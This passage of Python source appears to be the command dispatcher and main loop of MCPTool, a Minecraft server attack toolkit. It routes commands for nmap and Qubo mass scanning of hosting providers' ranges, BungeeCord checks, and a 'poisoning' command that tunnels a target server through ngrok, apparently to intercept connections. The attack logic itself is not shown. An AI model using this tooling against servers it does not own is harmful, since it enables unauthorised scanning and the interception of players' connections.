                print(f"\n{white}     Usage: {command.lower()} [domain] or [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Server): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "player":
            try:
                nick = argument[1]
                player_command(nick)

            except IndexError:
                print(f"\n{white}     Usage: player [name]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Player): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "scan":
            try:
                target = argument[1]
                ports = argument[2]
                check__nmap = check_nmap()

                if check__nmap:
                    skip = skip_0on()
                    number_of_servers = 0
                    nmap_scan("scan", target, ports, skip, None)
                    print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: scan [ip:port] [ports]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Scan): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "host":
            try:
                host = argument[1].lower()
                ports = argument[2]
                check__nmap = check_nmap()

                if check__nmap:
                    if host in host_list:
                        skip = skip_0on()
                        number_of_servers = 0
                        host_command(host, ports, skip)
                        print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

                    else:
                        print(f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Host not found! \n     {white}Available hosts (minehost, holyhosting, vultam){reset}")

            except IndexError:
                print(f"\n{white}     Usage: host [host] [ports]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Host): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "qubo":
            try:
                target = argument[1]
                ports = argument[2]
                threads = argument[3]
                timeout = argument[4]
                check__java = check_java()

                if check__java:
                    check__qubo = check_qubo(threads, timeout)
                    if check__qubo:
                        skip = skip_0on()
                        number_of_servers = 0
                        qubo_command(target, ports, threads, timeout, skip)
                        print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: qubo [ip] [ports] [threads] [timeout]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Qubo): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "mods":
            try:
                target = argument[1]
                check__server = check_server(target)

                if check__server:
                    mods_command(target)

            except IndexError:
                print(f"\n{white}     Usage: mods [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Mods): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "listening":
            try:
                target = argument[1]
                check__server = check_server(target)

                if check__server:
                    listening_command(target)

            except IndexError:
                print(f"\n{white}     Usage: listening [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Qubo): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "checker":
            try:
                file = argument[1]
                check__nmap = check_nmap()

                if check__nmap:
                    skip = skip_0on()
                    number_of_servers = 0
                    checker_command(file, skip)
                    print(f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")

            except IndexError:
                print(f"\n{white}     Usage: checker [file]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Checker): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "bungee":
            try:
                target = argument[1]
                check__java = check_java()

                if check__java:
                    bungee_command(target)

            except IndexError:
                print(f"\n{white}     Usage: bungee [ip:port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Server): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "poisoning" or command.lower() == "poisoning":
            try:
                target = argument[1]
                port = argument[2]
                check__java = check_java()

                if check__java:
                    check__ngrok = check_ngrok(port)
                    if check__ngrok[0]:
                        check__server = check_server(target)
                        if check__server:
                            check__port = check_port(port)
                            if check__port:
                                poisoning_command(target, port, check__ngrok[1])

            except IndexError:
                print(f"\n{white}     Usage: poisoning [ip:port] [port]")

            except Exception as e:
                if DEBUG:
                    print(f"     [DEBUG] Exception (Server): {e} \n\n{traceback.format_exc()}")

        elif command.lower() == "discord" or command.lower() == "ds":
            print(f"\n     {white}My Discord server: {lcyan}{discord_link}{reset}")

        else:
            print(f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")

    except KeyboardInterrupt:
        print(f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")

    except:
        pass


if __name__ == "__main__":
    os.system("clear || cls & title MCPTool")

    if not SKIP_LOAD:
        load()

    os.system("clear || cls ")
    print(banner)

    while True:
        if os.name == "nt":
            print(f"\n {reset}{red}    root@windows:~/MCPTool# {lblack}» {white} ", end="")
            main()

        else:
            print(f"\n {reset}{red}    root@linux:~/MCPTool# {lblack}» {white} ", end="")
            main()
